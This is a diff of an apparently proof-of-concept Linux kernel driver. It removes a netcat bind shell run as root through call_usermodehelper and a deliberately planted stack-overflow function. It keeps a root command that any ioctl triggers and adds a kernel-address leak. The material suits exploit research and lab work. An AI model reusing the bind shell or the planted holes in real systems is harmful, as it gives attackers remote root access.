@@ -20,7 +20,12 @@ static dev_t dev;
 static struct cdev c_dev;
 static struct class *cl;
 
-void vulnerable_func(const char *msg, ssize_t msg_size, short call_times);
+static char *argv[] = {
+    "/bin/bash",
+    "-c",
+    "rm -f /tmp/hello && touch /tmp/hello",
+    NULL
+};
 
 static int my_open(struct inode *i, struct file *f) { return 0; }
 static int my_close(struct inode *i, struct file *f) { return 0; }
@@ -31,48 +36,9 @@ static int my_ioctl(struct inode *i, struct file *f, unsigned int cmd,
 static long my_ioctl(struct file *f, unsigned int cmd, unsigned long arg)
 #endif
 {
-  struct poc_msg msg;
-  char *argv[] = {"/usr/bin/nohup", "/bin/bash", "-c",
-                  "rm -f /tmp/f && mkfifo /tmp/f && cat /tmp/f | /bin/sh -i "
-                  "2>&1 | nc -l 0.0.0.0 9999 > /tmp/f; rm -f /tmp/f",
-                  NULL};
-
-  switch (cmd) {
-  case VBOX_POC_SEND_MSG:
-    if (copy_from_user(&msg, (struct poc_msg *)arg, sizeof(struct poc_msg))) {
-      return -EACCES;
-    }
-
-    // printk(INFO "msg.length: %ld\n", msg.length);
-    // printk(INFO "msg.buffer: %s\n", msg.buffer);
-
-    // Call it multiple times to make sure we dont overwrite the return on ioctl
-    // handler
-    // vulnerable_func(msg.buffer, msg.length, 10);
-    printk(INFO "calling call_usermodehelper\n");
-    printk(INFO "call_usermodehelper: %d\n",
-           call_usermodehelper(argv[0], argv, NULL, 1));
-    printk(INFO "done with call_usermodehelper\n");
-  }
-
+  printk(INFO "my_ioctl: %p\n", (void *)my_ioctl);
+  call_usermodehelper(argv[0], argv, NULL, 1);
   return 0;
-}
-
-void vulnerable_func(const char *msg, ssize_t msg_size, short call_times) {
-  // The buffer we will overflow
-  char overflow_me[OF_SIZE];
-  printk(INFO "called vulnerable_func\n");
-  if (call_times < 0) {
-    // Doh! Used size of attacker controlled not defender controlled for copy!
-    // Stack overflow eminent!
-    memcpy(overflow_me, msg, msg_size);
-    // If we succeed in the memcpy then say so
-    // printk(INFO "msg.length: %d\n", msg_size);
-    printk(INFO "vulnerable_func finished memcpy\n");
-  } else {
-    vulnerable_func(msg, msg_size, --call_times);
-  }
-  printk(INFO "exit vulnerable_func\n");
 }
 
 static struct file_operations query_fops = {.owner = THIS_MODULE,
